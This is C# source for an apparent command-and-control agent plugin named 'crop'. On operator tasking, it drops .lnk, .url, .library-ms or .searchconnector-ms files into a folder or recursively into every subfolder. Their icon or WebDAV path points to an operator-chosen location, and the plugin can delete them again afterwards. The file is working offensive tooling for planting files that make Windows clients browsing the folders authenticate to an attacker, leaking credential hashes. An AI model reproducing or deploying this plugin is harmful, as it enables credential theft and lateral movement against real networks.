using Crop;
using Athena.Commands.Models;
using Athena.Commands;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class CropPlugin : IPlugin
    {
        public string Name => "crop";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            var recurse = bool.Parse(args["recurse"]);
            var clean = bool.Parse(args["clean"]);


            Config.targetLocation = args["targetLocation"].ToString();
            Config.targetFilename = args["targetFilename"].ToString();
            Config.targetPath = args["targetPath"].ToString();


            if (!Config.targetLocation.EndsWith("\\"))
                Config.targetLocation = Config.targetLocation + "\\";

            if (Config.targetFilename.EndsWith(".lnk"))
            {
                if (!args.ContainsKey("targetIcon") || string.IsNullOrEmpty(args["targetIcon"].ToString()))
                {
                    TaskResponseHandler.Write("No Target Icon specified" + Environment.NewLine, args["task-id"], true, "error");
                    return;
                }

                Config.targetIcon = args["targetIcon"].ToString().Trim();

                TaskResponseHandler.WriteLine("[*] Setting LNK value: " + Config.targetIcon, args["task-id"], false);
                TaskResponseHandler.WriteLine("[*] Icon location: " + Config.targetPath, args["task-id"], false);

                try
                {
                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            TaskResponseHandler.WriteLine("[*] Writing LNK to: " + output, args["task-id"], false);
                            CropHelper.CreateLNKCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                TaskResponseHandler.WriteLine("[*] Removing file: " + f + Config.targetFilename, args["task-id"], false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        TaskResponseHandler.WriteLine("[*] Writing LNK to: " + output, args["task-id"], false);
                        CropHelper.CreateLNKCrop(output);
                    }
                }
                catch (Exception e)
                {
                    TaskResponseHandler.WriteLine(e.ToString(), args["task-id"], true, "error");
                }
            }
            else if (Config.targetFilename.ToLower().EndsWith(".url") || Config.targetFilename.ToLower().EndsWith(".library-ms") || Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
            {
                TaskResponseHandler.WriteLine("[*] Setting WebDAV value: " + Config.targetPath, args["task-id"], false);
                try
                {

                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            TaskResponseHandler.WriteLine("[*] Writing file to: " + output, args["task-id"], false);
                            CropHelper.CreateFileCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                TaskResponseHandler.WriteLine("[*] Removing file: " + Config.targetFilename, args["task-id"], false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        TaskResponseHandler.WriteLine("[*] Writing file to: " + output, args["task-id"], false);
                        CropHelper.CreateFileCrop(output);
                    }
                }
                catch (Exception e)
                {
                    TaskResponseHandler.WriteLine(e.ToString(), args["task-id"], true, "error");
                    return;
                }
            }
            else
            {
                TaskResponseHandler.WriteLine("[!] Not a valid file: " + Config.targetFilename, args["task-id"], true, "error");
                return;
            }
            TaskResponseHandler.WriteLine("[*] Done.", args["task-id"], true);
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}